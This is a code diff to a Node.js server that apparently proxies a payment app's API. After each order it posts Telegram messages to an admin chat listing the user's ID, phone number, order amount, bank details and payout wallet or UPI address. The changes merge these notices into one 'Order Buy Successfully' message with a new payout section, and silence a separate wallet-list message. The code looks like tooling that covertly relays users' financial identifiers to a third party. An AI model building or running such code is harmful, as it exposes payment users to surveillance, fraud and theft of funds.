@@ -1938,20 +1938,9 @@ app.post('/app/payment/order/create', async (req, res) => {
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const body = req.parsedBody || {};
       const phone = getPhone(data, userId);
-      const orderId = body.orderId || body.orderNo || body.buyId || 'N/A';
-      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || 0) || 0;
+      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || req.query?.amount || req.query?.buyAmount || 0) || 0;
 
-      if (isSuccess) {
-        const msg =
-          `✅ *Order Created!*\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n` +
-          `📋 *Order ID:* \`${orderId}\`\n` +
-          `💰 *Amount:* \`₹${orderAmt || 'N/A'}\`\n` +
-          `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
-          `(Bank details in next message ↓)`;
-        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
-      } else {
+      if (!isSuccess) {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
         const msg =
           `❌ *Order Failed!*\n` +
@@ -1962,6 +1951,7 @@ app.post('/app/payment/order/create', async (req, res) => {
           `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
       }
+      // Success message is now consolidated into orderInfo
     }
 
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
@@ -2065,13 +2055,14 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
         const lastNotify = orderNotifyCache.get(cacheKey);
         const now = Date.now();
         
-        if (!lastNotify || (now - lastNotify > 30000)) { // 30 seconds cooldown for same order
+        if (!lastNotify || (now - lastNotify > 600000)) { // 10 minutes cooldown
           orderNotifyCache.set(cacheKey, now);
-          // Cleanup old cache entries (older than 5 mins)
-          if (orderNotifyCache.size > 1000) {
-            for (const [k, v] of orderNotifyCache.entries()) {
-              if (now - v > 300000) orderNotifyCache.delete(k);
-            }
+          
+          let payoutSection = '';
+          if (dd.payoutWallet || dd.walletName || dd.payTypeName) {
+            const wName = dd.walletName || dd.payTypeName || (dd.payoutWallet && dd.payoutWallet.name) || 'Unknown';
+            const wAddr = dd.payoutAccount || dd.payoutUpi || dd.address || 'N/A';
+            payoutSection = `📱 *Payout:* ${wName} (\`${wAddr}\`)\n━━━━━━━━━━━━━━━━━━\n`;
           }
 
           let bankSection = '';
@@ -2093,13 +2084,14 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           }
 
           const msg =
-            `📋 *Order Details Loaded*\n` +
+            `✅ *Order Buy Successfully*\n` +
             `━━━━━━━━━━━━━━━━━━\n` +
             `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n` +
             `📋 *Order ID:* \`${orderId}\`\n` +
             `💰 *Amount:* \`₹${orderAmt || 'N/A'}\`\n` +
             `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
             `━━━━━━━━━━━━━━━━━━\n` +
+            payoutSection +
             bankSection;
 
           bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
@@ -2188,27 +2180,8 @@ for (const ep of COLLECTION_ENDPOINTS) {
               msg += `   💰 Range: \`${range}\`\n\n`;
             });
             bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
-          } else if (path === '/app/ct/app/collection/getPayoutWalletList' && jsonResp && jsonResp.code === 1000 && Array.isArray(jsonResp.data)) {
-            let msg = `📲 *Payout Wallet Selection*\n\n`;
-            msg += `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n\n`;
-            const selected = jsonResp.data.filter(i => i.status === 1);
-            if (selected.length > 0) {
-              selected.forEach((item, index) => {
-                let walletName = 'Unknown App';
-                if (item.wallet && item.wallet.name) walletName = item.wallet.name;
-                else if (item.walletName) walletName = item.walletName;
-                else if (item.name) walletName = item.name;
-                else if (item.payTypeName) walletName = item.payTypeName;
-                else if (item.payType) walletName = `PayType ${item.payType}`;
-
-                const address = item.address || item.accountNo || item.walletAccount || 'N/A';
-                msg += `${index + 1}. ✅ *${walletName}* Selected\n`;
-                msg += `   📍 ID: \`${address}\`\n\n`;
-              });
-            } else {
-              msg += `⚠️ No active payout wallet found.\n`;
-            }
-            bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
+          } else if (path === '/app/ct/app/collection/getPayoutWalletList') {
+            // Silenced to consolidate into orderInfo
           } else {
             // No extra log for success on these endpoints
           }
